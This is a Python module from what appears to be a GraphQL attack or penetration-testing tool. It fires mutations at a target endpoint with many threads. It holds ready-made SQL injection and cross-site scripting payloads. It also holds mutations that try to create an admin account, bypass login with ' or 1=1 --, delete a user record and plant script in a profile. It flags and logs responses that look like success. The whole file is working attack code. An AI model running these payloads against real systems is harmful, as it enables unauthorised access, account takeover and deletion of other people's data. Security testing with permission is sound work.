import requests
import json
import threading
import time
import os
from core.utils import save_to_report

COMMON_MUTATIONS = [
    "mutation { __typename }",
    "mutation { createUser(username:\"admin\", password:\"pass\") { id } }",
    "mutation { login(username:\"admin\", password:\"' or 1=1 --\") { token } }",
    "mutation { deleteUser(id:1) { id } }",
    "mutation { updateProfile(bio:\"<script>alert(1)</script>\") { bio } }"
]

FUZZ_VALUES = [
    "' OR '1'='1",
    "admin' --",
    "\" OR TRUE--",
    "<script>alert(1337)</script>",
    "\\x27\\x20OR\\x201=1--"
]

def mutate_payload(payload):
    mutations = []
    for fuzz in FUZZ_VALUES:
        mutated = payload.replace("admin", fuzz).replace("password", fuzz).replace("bio", fuzz)
        mutations.append(mutated)
    return mutations

def send_mutation_request(url, mutation, headers, timeout, retries, verbose):
    for attempt in range(retries):
        try:
            data = json.dumps({"query": mutation})
            response = requests.post(url, headers=headers, data=data, timeout=timeout)
            result = {
                "mutation": mutation,
                "status_code": response.status_code,
                "response": response.text[:300]
            }
            if verbose:
                print(f"[DEBUG] Mutation tried: {mutation[:80]}... => Status: {response.status_code}")
            if "error" not in response.text.lower() or "success" in response.text.lower():
                print("[!] Interesting behavior detected!")
                save_to_report("mutation_engine", result)
            return result
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(1)
            else:
                print(f"[-] Final failure for mutation: {mutation[:60]} | Error: {e}")
                return {"mutation": mutation, "status_code": "ERROR", "response": str(e)}


def run_mutation_engine(base_url, endpoint, headers, threads=5, timeout=10, retries=2, verbose=False):
    url = endpoint if endpoint.startswith("http") else base_url.rstrip("/") + "/" + endpoint.lstrip("/")
    print(f"[*] Fuzzing mutations at: {url} with {threads} threads")

    results = []
    payload_queue = []

    for base_mutation in COMMON_MUTATIONS:
        mutated_variants = mutate_payload(base_mutation)
        payload_queue.extend(mutated_variants)

    def worker():
        while payload_queue:
            mutation = payload_queue.pop()
            result = send_mutation_request(url, mutation, headers, timeout, retries, verbose)
            results.append(result)

    thread_list = []
    for _ in range(min(threads, len(payload_queue))):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(f"[*] Mutation fuzzing complete. {len(results)} mutations tested.")

    # Save all results to log file
    os.makedirs("output/logs", exist_ok=True)
    log_path = "output/logs/mutation_log.txt"

    with open(log_path, "w", encoding="utf-8") as f:
        for entry in results:
            f.write(json.dumps(entry, indent=2) + "\n")

    print(f"[+] Mutation results saved to {log_path}")
    return results
